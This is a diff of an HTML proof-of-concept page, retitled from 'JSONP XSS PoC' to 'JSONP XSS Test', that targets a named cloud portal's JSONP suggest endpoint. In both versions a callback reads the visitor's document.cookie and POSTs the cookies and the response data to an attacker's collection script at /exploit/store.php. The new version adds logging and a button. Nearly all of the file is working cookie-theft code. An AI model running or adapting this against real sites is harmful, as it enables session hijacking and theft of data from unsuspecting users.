@@ -2,34 +2,43 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="referrer" content="no-referrer">
-    <title>JSONP XSS PoC</title>
-</head>
-<body>
-    <h1>JSONP XSS Exploit PoC</h1>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSONP XSS Test</title>
     <script>
-        // Callback function that receives the data (cookies)
+        // Define the callback function that the JSONP response will call
         function call_me(data) {
-            // Send the data (victim's cookies) to your server
-            var http = new XMLHttpRequest();
-            var url = 'http://127.0.0.1/exploit/store.php'; // Replace with your server URL
-            var params = 'cookies=' + document.cookie + '&data=' + JSON.stringify(data);
+            // Extract cookies from the document
+            var cookies = document.cookie;
 
+            // Log the response data and cookies to the console for debugging
+            console.log("JSONP response data:", data);
+            console.log("Cookies:", cookies);
+
+            // Send the cookies and data to your server
+            var http = new XMLHttpRequest();
+            var url = 'http://127.0.0.1/exploit/store.php'; // Your PHP endpoint
+            var params = 'cookies=' + encodeURIComponent(cookies) + '&data=' + encodeURIComponent(JSON.stringify(data));
+
+            // Configure the POST request
             http.open('POST', url, true);
+
+            // Set the content type for form data
             http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            
-            http.onreadystatechange = function() {
-                if(http.readyState == 4 && http.status == 200) {
-                    console.log('Data sent to server.');
-                }
-            };
+
+            // Send the POST request with cookies and data
             http.send(params);
         }
 
-        // Call the vulnerable endpoint, passing the `call_me` function as the callback
-        var script = document.createElement('script');
-        script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me&q=数字货币交易所&from=nav&language=zh-cn&_=1642759632999'; // Vulnerable endpoint
-        document.body.appendChild(script);
+        // Function to load the JSONP script
+        function loadJsonp() {
+            var script = document.createElement('script');
+            script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me&q=数字货币交易所&from=nav&language=zh-cn&_=1642759632999';
+            document.head.appendChild(script);
+        }
     </script>
+</head>
+<body>
+    <h1>JSONP XSS Test</h1>
+    <button onclick="loadJsonp()">Click me to load data</button>
 </body>
 </html>
